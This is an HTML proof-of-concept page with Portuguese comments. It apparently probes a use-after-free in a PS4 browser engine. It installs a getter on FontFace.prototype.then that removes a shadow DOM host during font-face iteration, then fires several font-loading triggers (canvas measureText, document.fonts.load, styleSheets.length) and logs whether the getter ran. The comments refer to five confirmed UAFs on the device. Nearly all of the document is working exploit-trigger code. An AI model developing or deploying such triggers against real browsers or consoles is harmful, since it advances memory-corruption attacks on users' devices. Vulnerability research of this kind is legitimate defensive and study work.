<!DOCTYPE html>
<html>
<body>
<script>
// Versao 2: aplica os padroes dos 5 UAFs confirmados no PS4
// Mudancas principais:
//   1. FontFaceSet.prototype.then ? FontFace.prototype.then  (padrão dos 5 testes)
//   2. styleSheets.length         ? measureText()            (trigger confirmado)
//   3. URL externa                ? Blob URL local            (sem depender de rede)

document.fonts;

function log(msg) {
    document.body.appendChild(document.createTextNode(msg));
    document.body.appendChild(document.createElement("br"));
}

function run() {
    // --- Setup Shadow DOM (igual ao original) ---
    const host = document.createElement("div");
    document.body.appendChild(host);
    const shadowRoot = host.attachShadow({ mode: "open" });

   

    const fontFaceStyle = document.createElement("style");
    fontFaceStyle.textContent =
        `@font-face { font-family: reentryFont; src: url("resources/no-such-font-for-reentry.otf"); }` +
        `.probe { font: 24px reentryFont; }`;
    shadowRoot.appendChild(fontFaceStyle);

    const probe = document.createElement("span");
    probe.className = "probe";
    probe.textContent = "A";
    shadowRoot.appendChild(probe);

    document.body.offsetHeight;
    document.fonts.load("24px reentryFont", "A");
    log("status: " + document.fonts.status);

    document.fonts.ready;

    // Dar pendencia UpdateType::ActiveSet no shadow scope
    const prependedStyle = document.createElement("style");
    prependedStyle.textContent = ".unused { color: red; }";
    shadowRoot.prepend(prependedStyle);

    // --- MUDANCA 1: getter em FontFace.prototype.then ---
    // Padrao dos 5 testes confirmados no PS4
    let getterCallCount = 0;
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            delete FontFace.prototype.then;
            ++getterCallCount;
            log(">>> FontFace.prototype.then getter! count=" + getterCallCount);
            host.remove(); // Libera o no iterado em m_inDocumentShadowRoots
            return undefined;
        }
    });

    // --- MUDANCA 2: triggers confirmados no PS4 ---

    // Trigger A: measureText (usado em CSSFontSelector, SegmentedFontFace, FontMetrics)
    const canvas = document.createElement("canvas");
    canvas.width = 64; canvas.height = 64;
    document.body.appendChild(canvas);
    const ctx = canvas.getContext("2d");
    ctx.font = "24px reentryFont";
    ctx.measureText("A");
    log("apos measureText: getter=" + getterCallCount);

    // Trigger B: fonts.load (usado em UAF_FontFace)
    if (getterCallCount === 0) {
        document.fonts.load("24px reentryFont", "A");
        log("apos fonts.load: getter=" + getterCallCount);
    }

    // Trigger C: styleSheets.length original (fallback)
    if (getterCallCount === 0) {
        document.styleSheets.length;
        log("apos styleSheets.length: getter=" + getterCallCount);
    }

    log("--- RESULTADO ---");
    log("getter total: " + getterCallCount);
    log("status final: " + document.fonts.status);
    log("PASS se nao travou.");
}

window.addEventListener("load", () => setTimeout(run, 0));
</script>
</body>
</html>
